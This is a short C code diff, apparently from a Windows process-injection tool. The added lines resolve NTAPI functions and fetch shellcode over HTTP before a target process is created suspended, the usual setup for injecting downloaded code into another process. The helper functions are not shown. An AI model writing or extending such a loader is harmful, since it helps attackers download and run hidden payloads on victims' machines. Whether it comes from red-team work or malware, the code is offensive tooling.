@@ -41,6 +41,16 @@ int main() {
     wprintf(L"[*] Target: %s\n", INJECTION_TARGET_PATH);
 
     INJECT_CTX ctx = {0};
+    if (!NtapiInit(&ctx.api)) {
+        printf("[-] Failed to resolve NTAPI\n");
+        return 1;
+    }
+
+#if defined(USE_SHELLCODE_FETCH_HTTP)
+    if (!GetShellcode_Http(&ctx)) goto cleanup;
+#else
+    #error "No shellcode technique selected"
+#endif
 
 #if defined(USE_CREATE_SUSPENDED)
     if (!CreateTarget_Suspended(&ctx)) goto cleanup;
